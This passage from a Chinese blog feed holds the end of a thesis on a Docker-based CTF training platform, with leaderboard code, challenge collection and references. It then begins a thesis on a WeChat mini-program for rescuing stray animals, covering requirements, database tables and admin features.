src="D:%5Cblog%5Cshierjinghuang%5Csource_posts%5C%E5%9F%BA%E4%BA%8EDocker%E5%AE%B9%E5%99%A8%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%B9%B3%E5%8F%B0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%5Cwps28.jpg" alt="img"></p><p>图4-11 排行榜模块实现</p><p>关键代码如下：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> InquireLeaderboard <span class="token punctuation">(</span>i <span class="token operator">*</span>gin<span class="token punctuation">.</span> Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  DB<span class="token punctuation">:</span> <span class="token operator">=</span> common<span class="token punctuation">.</span> GetDB <span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">var</span> UserList <span class="token punctuation">[</span><span class="token punctuation">]</span> ComputerUser  DB<span class="token punctuation">.</span> Select <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token builtin">string</span><span class="token punctuation">&#123;</span><span class="token string">"nick_name"</span><span class="token punctuation">,</span><span class="token string">"number"</span><span class="token punctuation">,</span><span class="token string">"integral"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span> Limit <span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span> Order <span class="token punctuation">(</span><span class="token string">"integral desc"</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token function">Find</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>UserList<span class="token punctuation">)</span>  i<span class="token punctuation">.</span>JSON <span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H <span class="token punctuation">&#123;</span>  <span class="token string">"data"</span><span class="token punctuation">:</span> UserList<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-5-题目搜集和整理">4.5 题目搜集和整理</h4><p>​由于CTF赛题涉及知识范围广泛，参与者通过这类竞赛能够接触到网络安全的各个领域，从而全面提升网络安全从业人员的技术水平和知识储备。对其中各种网络安全基础知识的掌握是解决相应CTF赛题的关键。这些知识包括了网络协议的原理、反编译技术、密码编码学、常见的渗透方式和加固策略等内容。通过解决与网络安全相关的CTF赛题，参与者可以更加深入地了解网络协议、加解密算法、漏洞利用技术等内容，从而在未来可能面临的网络安全维护中更加熟练地应对各种挑战。</p><p>​题库搜集过程中详细阅读了从0到1 CTFer成长之路，据此主要围绕附件型题目搜集，覆盖了附件型题目常见知识点，并根据难易程度进行了梯度划分，适合初学者提高网络安全能力。Web题目主要依据白帽子讲Web安全中介绍的常见Web渗透场景及漏洞，用户可以根据自身情况，在不同阶段选择适合自己的不同类型的题目，循序渐进，逐步提升自身能力^[12]^。</p><h3 id="5-总结">5 总结</h3><p>基于Docker容器的网络安全实验平台，在借鉴了现有网络安全实验平台的设计思路与实现方式的基础上，明确了系统的基本功能模块并进行总体设计，采用 Vue3+Element Plus+Go+MySQL 的架构。同时采用详细的设计保证系统的机密性、完整性与可用性，并设置预留扩展接口，保证平台的可拓展性。</p><p>在系统实现后，参考网络安全经典书籍与知识体系收集了大量CTF题目，目前题库中已经上传大量网络安全题目，包括历年各项赛事真题。本系统为网络安全初学者和高校中参加CTF竞赛的学生提供一个在线练习平台。涵盖了Web、Reverse、Misc、Crypto、Pwn等多种类型，涉及知识全面。</p><p>同时基于Docker容器的网络安全实验平台尚有些许不足，平台着重于CTF类型的题目，对于新兴的AWD以及AWD plus等比赛形式涉及较少，可考虑后期扩充。</p><h3 id="参考文献">参考文献</h3><p>[1] 吴世忠．2024年网络与信息安全风险前瞻[J]．中国信息安全，2023(12)：14-18．</p><p>[2] 李伦，王曦，郝志宇．美国网络空间靶场建设情况综述[J]．保密科学技术，2021(06)：53-60．</p><p>[3] 赵静，汤荣秀．网络攻防竞赛平台搭建[J]．无线互联科技，2023，20(17)：160-162．</p><p>[4] 玄世昌，王巍，苘大鹏等．基于虚拟靶场的渗透测试实践教学机制探索[J]．高教学刊，2024，10(02)：29-32．</p><p>[5] 宋晓锋，倪林，韩鹍等．CTF竞赛融入网络安全人才培养过程的探索与实践[J]．计算机教育，2021(11)：1-5．</p><p>[6] 梁建辉，侯昱辉，刘润福等．基于Docker的网络安全靶场设计与实现[J]．铁路计算机应用，2022，31(11)：67-70．</p><p>[7] 刘京菊，王永杰．面向人才培养的网络靶场体系与分类研究[J]．保密科学技术，2021(06)：18-23．</p><p>[8] 王海涛，宋丽华．浅析网络靶场的概念、分类与体系架构[J]．保密科学技术，2021(06)：4-9．</p><p>[9] 刘莉，刘持标，尤垂桔等．结合CTF竞赛的网络安全课程教学改革[J]．计算机教育，2019(04)：107-111．</p><p>[10] 闫梅．基于Docker容器化的Web渗透测试平台实现与应用[J]．信息记录材料，2021，22(09)：138-140.</p><p>[11] GB/T 42446-2023，信息安全技术 网络安全从业人员能力基本要求[S]．</p><p>[12] 王济昂，朱雨晨，马越等．基于Docker容器化部署的CTF线上靶场系统[J]．电子技术与软件工程，2021,(07)：210-212．</p>]]></content>
      
      
      <categories>
          
          <category> 项目设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 毕业论文 </tag>
            
            <tag> Vue </tag>
            
            <tag> Go </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于微信小程序的流浪动物救助系统的设计与实现</title>
      <link href="/2025/02/12/%E5%9F%BA%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E6%B5%AA%E5%8A%A8%E7%89%A9%E6%95%91%E5%8A%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
      <url>/2025/02/12/%E5%9F%BA%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E6%B5%AA%E5%8A%A8%E7%89%A9%E6%95%91%E5%8A%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="基于微信小程序的流浪动物救助系统的设计与实现">基于微信小程序的流浪动物救助系统的设计与实现</h2><p><strong>摘要</strong>：随着人们生活水平的提高，人们对于精神层面的要求也日益提高。动物作为人类的陪伴对象，逐渐成为人们精神寄托的重要来源之一。宠物行业迅速发展，但随之而来是宠物被遗弃与宠物丢失。大量动物流浪在街头巷尾，生存环境恶劣，生存状况堪忧，城市环境、卫生和安全也面临巨大压力。在此基础上，采用TypeScript语言，基于Spring Boot框架，数据库使用MySQL，借助<a href="https://so.csdn.net/so/search?q=HBuilder&amp;spm=1001.2101.3001.7020">HBuilder</a> X配置微信开发者工具，实现基于微信小程序的流浪动物救助系统。系统管理员拥有用户信息管理、动物信息管理、寻宠与招领管理等功能。系统用户则有发布寻宠招领动态、申请领养动物等功能。微信小程序不仅是一个便捷的平台，让用户可以方便地参救助工作，还是一个管理流浪动物信息的工具，促进流浪动物救助事业的发展。</p><p><strong>关键词</strong>：动物救助系统 Spring Boot MySQL</p><h3 id="引言">引言</h3><p>流浪动物的救助问题长期以来都是社会关注的焦点之一，它们面临着生存、医疗和安全等多方面困境。为了更好地解决问题，救助流浪动物，使用科技手段介入研究流浪动物救助问题成为一种新的方法。微信小程序作为一种便捷的移动应用程序形式^[1]^，为流浪动物救助系统的设计与实现提供了新的可能性。研究内容主要涉及流浪动物信息管理、流浪动物救助、领养流程优化、用户交互设计等方面，系统将分为前端小程序界面、后台管理界面和后端数据库管理，通过需求分析、设计系统、开发实现等阶段，不断完善改进系统。前端微信小程序界面，包括动物信息发布、动物信息展示、寻宠与领养、资讯阅读等功能。后台管理界面，包括动物信息管理、用户信息管理、资讯管理等功能。后端通过Navicat和MySQL协同使用，实现对数据库的高效操作。具体实现通过使用Spring Boot、Vue3、uniapp、TypeScript等技术开发出小程序与前后端分离的功能完善、界面友好的流浪动物救助系统小程序，提高流浪动物救助工作的便捷性和效率。通过设计实现流浪动物救助系统，为流浪动物救助工作提供一个简洁高效的信息传播与动物救助的平台，提高公众对流浪动物救助的关注度，推动流浪动物救助保护事业的发展，促进人与动物和谐相处。</p><h3 id="1-研究背景-目的与意义">1 研究背景、目的与意义</h3><h4 id="1-1-研究背景">1.1 研究背景</h4><p>在生活中，留守老人、空巢青年等群体^[2]^，往往会将宠物视为家庭的一部分，赋予它们陪伴自己生活的重要角色，并从中获取情感上的满足和乐趣。据相关资料显示，未来5年内，中国宠物猫狗的数量将会持续增加，从2023年的1.9亿只增至2.1亿只，宠物行业规模也将进一步扩大。同时，随着科技的进步和社交媒体的兴起，“云养宠”这一新兴的概念逐渐成为宠物行业的发展趋势，为宠物行业的未来展现出了广阔的前景。</p><p>然而，宠物饲养的增加也伴随着宠物被遗弃与宠物丢失现象的增多。《2021年中国宠物行业白皮书》指出，2021年流浪猫的数量高达5300万只，流浪狗的数量高达4000万只，流浪猫狗的总量近1亿^[3]^。同时《2023年-2024中国宠物行业白皮书》也表明，宠物猫狗的数量仍在增长，这意味着，流浪猫狗的数量也在不断增长。由此可见，整体流浪动物的数量庞大。据不完全统计，国内流浪动物数量每年新增约六千万，整体流浪动物的数量接近六亿^[4]^，可见现阶段我国流浪动物现状并不乐观，由于动物遗弃、妨害动物福利等行为缺乏相应的法律约束，救助组织缺少有效合作和协调，加上管理不善等原因，流浪动物问题一直未能得到有效控制和解决^[1]^。</p><p>随着科技的发展，互联网时代的到来无疑给流浪动物问题的解答提供了新的研究方向，它在信息传播、影响力等方面具有得天独厚的优势，利用移动应用帮助解决流浪动物救助问题，通过新媒体技术帮助流浪动物这一特殊的弱势群体，设计简洁高效的救助方案、寻宠与领养流程，将动物的生命福利放在首位，提高对流浪动物的救助质量，呼吁更多人了解并参与到流浪动物救助中，对解决现存的流浪动物救助问题有着十分重要的意义^[1]^。</p><h4 id="1-2-研究目的">1.2 研究目的</h4><p>流浪动物救助系统的研究目的不仅局限于简单的救助行动，而是致力于构建一个全面、高效、人性化的救助体系。这一体系旨在通过一系列精心设计的策略和措施，从根本上改善流浪动物的生活状况，同时唤起社会对这一群体的广泛关注。流浪动物救助系统研究的首要目标是提高救助效率。通过优化救助流程、引入先进的科技手段，促进救助行动更加迅速、准确和有效。这不仅能提高救助的成功率，还能最大程度地减少救助过程中的风险和不确定性。具体研究目的总结如下。</p><ol><li><p>整合资源，数字化管理动物信息</p><ul><li>构建一个协同合作的流浪动物救助系统，对流浪动物救助工作进行数据化管理和分析，为相关决策提供数据依据。</li></ul></li><li><p>推动和支持流浪动物救助事业发展</p><ul><li>通过研究和实践，为流浪动物保护事业提供多样化思路，配合与支持相关政府部门、机构和社会组织加大对流浪动物救助工作。</li></ul></li><li><p>互联网+公益模式构建流浪动物救助系统^[5]^</p><ul><li>通过互联网技术，充分发挥其信息传播优势，扩大覆盖范围，提高大众与参与度，利用便捷的移动应用小程序，促进科技在公益领域的应用，提高流浪救助效率。</li></ul></li></ol><h4 id="1-3-研究意义">1.3 研究意义</h4><p>流浪动物救助系统的研究意义，不仅仅在于维护流浪动物的基本生存福利和提升公众对动物的爱护与救助意识，更在于减少疾病传播风险、维护生态平衡和生物多样性、提高社会道德和伦理水平以及为其他社会问题提供借鉴和启示。通过深入研究和持续实践，不断完善和发展这一系统，为流浪动物和人类社会的共同福祉做出更大的贡献。同时，通过全社会的共同努力和参与，形成一个更加文明、和谐和进步的社会。具体意义总结如下。</p><ol><li><p>保护动物的生存权利与福利</p><p>通过流浪动物救助系统的设计与实现，努力维护他们无饥渴之忧的生理福利、有适当住所的环境福利、减少疾病的卫生福利、表达本性的行为福利以及降低恐惧及焦虑心情的心理福利，减少它们受到的伤害和虐待，提高它们生存的希望^[5]^。</p></li><li><p>提高公众意识，促进社会和谐</p><p>通过关注和救助流浪动物，可以促进社会的和谐与稳定，增强社会成员的责任感和共情能力，推动社会对动物权益的重视和保护，培养民众关爱生命、救助生命的意识，促进人与动物之间的和谐共生^[6]^，从而维护整个生态系统的健康与稳定。</p></li><li><p>推动科技与公益结合，提高救助效率</p><p>救助工作者可以通过小程序系统管理救助流程、信息发布等工作，提高工作效率。将新时代科技与公益救助事业相结合，提高流浪动物救助工作的效率和水平，探索解决流浪动物救助问题的新模式。这有助于推动相关公益救助的发展和创新，为动物保护和福利事业贡献力量。</p></li></ol><h3 id="2-环境与技术介绍">2 环境与技术介绍</h3><h4 id="2-1-开发环境">2.1 开发环境</h4><p>IDEA全称IntelliJ IDEA，是用于java语言开发的集成环境，也可用于其他语言，在业界被公认为最好的java开发工具之一^[7]^。IDEA具有强大的整合能力，支持主要流行的技术与框架，有快速、便捷的提示功能以及代码模板，便于系统设计人员快速高效的实现项目开发。</p><h4 id="2-2-navicat与mysql">2.2 Navicat与MySQL</h4><p>Navicat是功能丰富的数据库管理与开发工具，一个软件Navicat就可以打开MySQL、Redis等，不需要打开很多个图形化管理工具。用户界面友好直观，能够轻松简单的操作多种主流数据库。同时，Navicat支持数据同步和迁移，提供可视化数据库架构工具，帮助用户更直观地理解和操作数据库。</p><p>MySQL是一款开源的关系型数据库)管理系统，以其便捷易用的特性广受用户青睐，并且能够根据用户需求进行修改和定制；跨平台支持多个操作系统，具有很强的灵活性；高性能，能够快速处理大量数据和高并发请求；具备良好的可扩展性；支持分布式数据库架构，能够满足不同环境下的使用要求。</p><p>Navicat与MySQL协同使用，帮助用户更好地管理和操作MySQL数据库。通过Navicat，能够提高与MySQL等数据库进行交互的高效性和简洁性，更好地满足多种需求，提高项目开发的效率与质量。</p><h4 id="2-3-typescript编程语言">2.3 TypeScript编程语言</h4><p>[TypeScript是JavaScript的一个超集，是由微软开发的自由和开源的编程语言。TypeScript可以编译成纯JavaScript，并将生成的JavaScript结果运行在任意浏览器、任意计算机和任意操作系统上。TypeScript不仅增加了代码的可读性和可维护性，同时保持了代码的简洁与灵活，给使用者带来极大便利。</p><h4 id="2-4-spring-boot框架">2.4 Spring Boot框架</h4><p>Spring Boot是由Pivotal团队提供的全新的轻量级框架，其设计目的是用来简化Spring应用的创建、运行、调试、部署等[8]。Spring Boot也被称为微框架，可以简化Maven配置，没有代码生成、可以不用XML配置，轻松创建基于生产级别的、独立的应用程序。</p><h3 id="3-需求分析">3 需求分析</h3><h4 id="3-1-功能性需求分析">3.1 功能性需求分析</h4><p>功能性需求分析是开发系统的一个必要前提，通过功能性需求分析帮助系统设计人员更好的了解用户的实际需求情况，更好地解决流浪动物救助问题，同时这也是系统开发的原因。基于现实因素考虑，通过流浪动物救助系统小程序的基本功能是实现对流浪动物信息的管理及其救助，满足用户的实际需求。管理员的主要功能是实现对流浪动物救助相关事务的整体管理，具体管理流浪动物信息、用户信息、轮播图信息、资讯与反馈信息等。用户的主要功能是实现对流浪动物的救助与相关信息的宣传。</p><p>经过对用户的实际需求分析，流浪救助系统的设计分为两大模块：管理员模块和用户模块。为了提高系统的安全性、管理的简洁性和用户信息的保密性，为管理员和用户设置不同的登录与使用权限，拥有不同的系统管理功能、使用功能。</p><p>管理员功能模块：管理员登录系统时，必须核验账户、密码与验证码。检测通过后，才可以成功进入系统的管理后台，查看并管理相关用户信息和流浪动物信息。管理员可以对相关信息进行审核、编辑与删除；可以进行资讯管理、公告管理与反馈信息管理；管理员拥有权限修改和设置用户账户密码的功能；同时，设有超级管理员拥有管理员所有权限与功能，同时能够限制管理员的权限与功能。</p><p>用户功能模块：新用户登录小程序前，先正确填写注册账户信息，信息成功录入数据库后，用户能够成功登录进入小程序；已注册用户登录验证通过后，成功进入小程序，通过个人中心可以查看修改其个人信息与密码；可以发布、查看、收藏寻宠与招领信息；可以阅读学习最新资讯；同时，设有反馈功能，用户可以反馈遇到的问题，提出改进建议，便于系统的完善升级，提升用户使用体验。</p><h4 id="3-2-非功能性需求分析">3.2 非功能性需求分析</h4><p>系统的设计与实现不仅要满足基础的功能性需求，非功能性需求的实现也要格外重视。非功能性需求是为了满足系统用户的基础需求而必须具有，而且是除了功能性需求以外的重要特性，这些特性影响着系统能否持续稳定、安全、高效地提供服务。</p><p>可靠性是流浪动物救助系统的一个重要属性。在救助工作中，系统的可靠性对于保障动物的安全和救助工作的顺利开展至关重要。因此，系统需要具有一定的稳定性和容错能力，遇到突发异常情况是时也能及时识别问题并做出反馈，维护系统的持续可用性。</p><p>在可维护性方面，为了持续满足用户需求，系统需要不断的迭代与维护。因此，在设计过程中有必要对系统进行清晰的设计，使系统架构完整，便于后续调整。</p><p>此外，可扩展性也是流浪动物救助系统必须考虑的因素之一。随着救助工作的不断发展、完善与用户使用数量的增长，系统需要具备强大的可扩展能力，以应对不断增加的用户数量和数据规模。</p><p>安全性是流浪动物救助系统中不可忽视的一个重要方面。系统必须确保用户信息的安全，防止数据泄露和非法访问。通过设置合理的权限分配和身份认证机制，可以确保不同用户角色使用系统时，权限能得到有效控制。同时，系统还可以采用加密技术等安全措施，保护用户信息和数据的安全性。</p><p>最后，易用性也是流浪动物救助系统需要考虑的重要因素。系统应该具备简洁一致的交互界面和清晰便捷的操作流程，使用户能够轻松入门并完成所需的操作。</p><p>总之，流浪动物救助系统的非功能性需求分析需要综合考虑其性能、可靠性、可维护性、可扩展性、安全性和易用性等多个方面。通过合理的设计和优化，努力打造出一个持久高效、稳定、安全的救助系统，为流浪动物的救助工作提供有力支持。</p><h3 id="4-系统设计">4 系统设计</h3><h4 id="4-1-总体设计">4.1 总体设计</h4><p>在系统的总体设计中, 采用比较可靠的三层架构体系结构。使用三层架构体系结构不仅结构清晰、耦合度低，而且容易移植和维护，利于开发任务同步进行, 适应需求变化[7]。</p><p>系统设计与实现整体上分为两大模块：管理员模块和用户模块。管理员有权限修改和设置用户账户密码与状态、管理动物信息、管理资讯、公告与反馈。用户可以在小程序中访问修改其个人信息与密码、完成动物信息发布与救助、阅读学习最新资讯、反馈问题，提出改进建议。具体模块功能图如图4-1所示。</p><p><img src="D:%5Cblog%5Cshierjinghuang%5Csource_posts%5C%E5%9F%BA%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E6%B5%AA%E5%8A%A8%E7%89%A9%E6%95%91%E5%8A%A9%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%5Cwps37.png" alt=""></p><center>图4-1 具体功能模块图</center>#### 4.2 详细设计<p>系统设计与实现的目的是为了提高流浪动物救助效率，通过借助微信小程序简化救助流程，提高信息传播效率，提高用户使用便捷性。因此在设计时主要考虑实现后台管理员功能和小程序用户功能。二者身份不同，功能使用权限也不同。</p><h5 id="4-2-1-管理员功能">4.2.1 管理员功能</h5><ol><li>管理员管理：通过分配菜单与按钮限制管理员拥有的权限，能够完成编辑、增加、删除管理员信息，重置管理员登录密码的操作。</li><li>用户管理：通过状态按钮决定用户是否正常，可以管理、删除用户信息，重置用户登录密码。</li><li>菜单管理：通过录入、编辑菜单及按钮，增加、减少管理员可分配权限。</li><li>动物分类：新增、编辑与删除动物类别，便于用户选择动物类别。</li><li>寻宠管理：审核用户寻宠信息是否合规，可以选择发布、热推，不合规可以撤销或删除。</li><li>招领管理：审核用户招领信息是否合规，可以选择发布、热推，不合规可以撤销或删除。</li><li>轮播图管理：选择用户已发布的寻宠或招领信息，进行轮播展示。</li><li>反馈管理：接收用户的问题反馈与建议，进行系统优化。</li><li>资讯管理：发布流浪动物救助相关事件与政策，宣传流浪救助公益活动，提高用户爱护动物的意识。</li></ol><h5 id="4-2-2-用户功能">4.2.2 用户功能</h5><ol><li>个人信息：用户进入个人中心后点击个人信息模块，可以查看相关信息，根据需求更改个人信息以及账号密码</li><li>发布功能：发布寻宠以及招领信息</li><li>收藏功能：浏览动物信息时，可以点击收藏，在个人中心即可找到收藏内容，方便查看。</li><li>阅读资讯功能：帮助用户了解动物救助相关事件与政策，提高用户对动物的保护意识。</li><li>反馈功能：用户可以反馈遇到的问题，提出改进建议。</li></ol><h5 id="4-2-3-数据库设计">4.2.3 数据库设计</h5><p>系统的实现离不开数据库的设计，通过实际需求分析，用户拥有基础信息属性外，还可以领养、发布与收藏不同类别的流浪动物信息；管理员拥有基础属性外，还可以进行用户、动物、轮播图、资讯、公告、反馈等信息的管理。因此，在Navicat中创建了10个相关数据库表来存储系统数据信息。该系统的数据库中最主要的四个表为：动物详情表animal、分类详情表animal_category、用户详情表wx_user、收藏与收养详情表animal_collect_adopt。根据用户使用不同功能，系统会调用不同数据库表来满足用户操作。流浪动物救助系统的数据库中E-R实体关系如图4-2所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\wps4.png" style="zoom:50%;" /><center>图4-2 数据库E-R图</center>**1.动物详情表animal**<p>动物详情表animal存放流浪动物相关信息，用户可以发布流浪动物信息，通过管理员审核后可以在小程序进行展示，可供用户完成浏览、搜索、寻找、领养等操作。该表主要包括了动物编号、动物类别编号、发布类别、动物名称、动物年龄、动物照片等信息。其中动物编号animal_id为本表主键。详情如表4-1所示。</p><center>表4-1 动物详情表</center>| 字段名称    | 数据类型   | 说明                      || ----------- | ---------- | ------------------------- || animal_id   | int        | 动物编号                  || find_status | varchar    | 状态 0：未完成，1：已完成 || name        | varchar    | 动物名称                  || image       | text       | 动物图片                  || introduce   | mediumtext | 动物介绍                  || user_id     | int        | 发布用户编号              || category_id | int        | 分类编号                  |<p><strong>分类详情表animal_category</strong></p><p>分类详情表animal_category存放动物类别信息，通过设置不同动物类别，便于用户按类型发布、寻找、领养相关动物，提高操作的便捷性，节约时间，带给用户高效的体验。该表主要包括了动物类别编号、动物类别名称、分类序号等信息。其中动物类别编号category_id为本表主键。详情如表4-2所示。</p><center>表4-2 分类详情表</center>| 字段名称      | 数据类型 | 说明     || ------------- | -------- | -------- || category_id   | int      | 分类编号 || category_name | varchar  | 分类名   |<p><strong>用户详情表wx_user</strong></p><p>用户详情表wx_user存放小程序用户信息，记录用户基础信息，完成对用户账户信息是否正常的监管。该表主要包括了用户编号、用户昵称、用户姓名、用户头像、用户电话、登录账户、登录密码、账户状态等信息。其中user_id为本表主键。详情如表4-3所示。</p><center>表4-3 用户详情表</center>| 字段名称  | 数据类型 | 说明                     || --------- | -------- | ------------------------ || user_id   | int      | 用户编号                 || nick_name | varchar  | 用户昵称                 || picture   | varchar  | 用户头像                 || phone     | varchar  | 用户电话                 || username  | varchar  | 登录账户                 || password  | varchar  | 登录密码                 || status    | varchar  | 账户状态0：启用，1：停用 |<p><strong>收藏与收养详情表animal_collect_adopt</strong></p><p>收藏与收养详情表animal_collect_adopt存放用户收藏、收养的动物信息，主要包括了收藏与收养的动物序号、用户编号、收藏与收养的动物编号等信息。其中collect_id为本表主键。详情如表4-4所示。</p><center>表4-4 收藏与收养详情表</center>| 字段名称     | 数据类型 | 说明                 || ------------ | -------- | -------------------- || collect_id   | int      | 收藏/收养序号        || user_id      | int      | 用户编号             || animal_id    | int      | 动物编号             || colletc_time | datetime | 收藏/收养时间        || type         | varchar  | 类型0：收藏，1：收养 |<p>为了方便系统实现前后台管理，在数据库中分别创建了管理员详情表sys_user、菜单权限详情表sys_menu、轮播图详情表sys_banner、关联管理员与菜单详情表user_menu、资讯详情表news、反馈详情表suggestion。通过这六个表帮助完善系统功能，使管理员提高管理效率，提升用户的使用体验。</p><p><strong>管理员详情表sys_user</strong></p><p>管理员详情表sys_user存放管理员信息，记录管理员基础信息，实现对管理员账户状态的监管。该表主要包括了管理员编号、管理员昵称、管理员性别、管理员电话、登录账户、登录密码、账户状态、是否为超级管理员等信息。其中管理员编号user_id为本表主键。详情如表4-5所示。</p><center>表4-5 管理员详情表</center>| 字段名称  | 数据类型 | 说明                     || --------- | -------- | ------------------------ || user_id   | int      | 管理员编号               || nick_name | varchar  | 管理员昵称               || sex       | varchar  | 管理员性别               || phone     | varchar  | 管理员电话               || username  | varchar  | 登录账户                 || password  | varchar  | 登录密码                 || status    | varchar  | 账户状态0：启用，1：停用 || is_admin  | varchar  | 超级管理员0：否，1：是   |<p><strong>菜单权限详情表sys_menu</strong></p><p>菜单详情表sys_menu存放所有菜单与按钮的权限信息，便于分配给管理员，各管理员权限不同，协同完成对系统的管理，提高系统的安全性。该表主要包括了菜单编号、上级菜单编号、菜单名称、权限字段、图标、显示序号、上级菜单名称、类型、路由等信息。其中menu_id为本表主键。详情如表4-6所示。</p><center>表4-6 菜单权限详情表</center>| 字段名称    | 数据类型 | 说明                   || ----------- | -------- | ---------------------- || menu_id     | int      | 菜单编号               || parent_id   | int      | 上级菜单编号           || title       | varchar  | 菜单名称               || code        | varchar  | 权限字段               || icon        | varchar  | 图标                   || order_num   | int      | 显示序号               || parent_name | varchar  | 上级菜单名称           || type        | varchar  | 权限类型1：菜单2：按钮 || path        | varchar  | 路由                   || create_time | datetime | 创建时间               |<p><strong>轮播图详情表sys_banner</strong></p><p>轮播图详情表sys_banner存放轮播图信息，管理员筛选上传紧急重要的流浪动物信息或宣传信息，通过轮播图将其展示在小程序首页，用户进入小程序即可关注到紧急重要信息，无形中提高流浪动物救助宣传力度。该表主要包括了轮播图编号、动物编号、标题、图片、轮播序号、发布状态等信息。其中轮播图编号ban_id为本表主键。详情如表4-7所示。</p><center>表4-7 轮播图详情表</center>| 字段名称  | 数据类型 | 说明                     || --------- | -------- | ------------------------ || ban_id    | int      | 轮播图编号               || animal_id | int      | 动物编号                 || title     | varchar  | 标题                     || image     | varchar  | 图片                     || order_num | int      | 轮播序号                 || status    | varchar  | 发布状态0：发布，1：撤销 |<p><strong>关联管理员与菜单详情表user_menu</strong></p><p>关联管理员与菜单详情表user_menu存放管理员权限信息，清晰地展示管理员已经拥有的管理权限。该表主要包括了关联编号、管理员编号、菜单编号等信息。其中关联编号user_menu_id为本表主键。详情如表4-8所示。</p><center>表4-8 关联管理员与菜单详情表</center>| 字段名称     | 数据类型 | 说明       || ------------ | -------- | ---------- || user_menu_id | int      | 关联编号   || user_id      | int      | 管理员编号 || menu_id      | int      | 菜单编号   |<p><strong>资讯详情表news</strong></p><p>资讯详情表news存放资讯信息，管理员筛选流浪动物救助相关政策以及重大事件进行上传至资讯管理页面，用户通过资讯阅读了解最新资讯，提高流浪动物救助意识。该表主要包括了资讯编号、标题、图片、内容、创建时间等信息。其中资讯编号news_id为本表主键。详情如表4-9所示。</p><center>表4-9 资讯详情表</center>| 字段名称    | 数据类型   | 说明     || ----------- | ---------- | -------- || news_id     | int        | 资讯编号 || title       | varchar    | 标题     || image       | varchar    | 图片     || content     | mediumtext | 内容     || create_time | datetime   | 创建时间 |<p><strong>反馈详情表suggestion</strong></p><p>反馈详情表suggestion存放用户反馈信息，用户使用小程序过程中，可以反馈使用体会、遇到的问题，提出改进建议，帮助完善系统。该表主要包括了反馈编号、用户编号、内容、创建时间等信息。其中反馈编号id为本表主键。详情如表4-10所示。</p><center>表4-10 反馈详情表</center>| 字段名称    | 数据类型 | 说明     || ----------- | -------- | -------- || id          | int      | 反馈编号 || user_id     | int      | 用户编号 || content     | text     | 内容     || create_time | datetime | 创建时间 |<h3 id="5-系统实现">5 系统实现</h3><h4 id="5-1-管理员功能实现">5.1 管理员功能实现</h4><p>管理员的功能主要负责流浪动物救助系统的信息管理，及时维护系统日常的安全、稳定与高效，关注用户需求，审核用户发布信息，及时推送重要信息。同时，管理员还拥有管理员管理、用户信息管理、寻宠与招领信息管理、轮播图管理、资讯管理、反馈管理等功能。</p><h5 id="5-1-1-登录功能">5.1.1 登录功能</h5><p>当打开系统跳转到登陆界面，该界面所显示的操作界面信息主要是有用户名、密码以及验证码, 如果数据库已存入该管理员信息，当输入账户名和密码时,并在验证码正确的情况下可以直接登录进入主界面，相反将出现账户名或者密码错误的显示。如图5-1 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\登录界面.jpg" style="zoom:50%;" /><center>图5-1 登录界面</center>##### 5.1.2 首页<p>管理员通过账户、密码验证成功后，登录进入管理后台首页。首页设有日历、反馈详情展示以及统计展示当前使用小程序的用户数量、用户发布的寻宠信息与招领信息的数量。如图5-2所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\首页界面.jpg" style="zoom:50%;" /><center>图5-2 首页界面</center>##### 5.1.3 管理员管理功能<p>登陆成功后进入后台管理主界面，点击管理员管理功能，完成管理员信息的新增、编辑、重置密码、删除等功能，其中设有超级管理员，拥有所有权限与功能，并负责为普通管理员分配使用权限。如图5-3、图5-4所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\管理员管理界面.jpg" style="zoom: 67%;" /><center>图5-3 管理员管理界面</center><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\管理员分配菜单界面.jpg" style="zoom:67%;" /><center>图5-4 管理员分配菜单界面</center>##### 5.1.4 用户管理功能<p>管理员拥有对用户信息管理的功能，可以对用户信息进行编辑、审核与删除。用户忘记密码时不仅可以选择自主找回、重置密码，还可以通过联系管理员在后台重置用户密码；当用户账户异常时，可以及时停用该账户，维护系统安全。如图5-5所示。</p><img 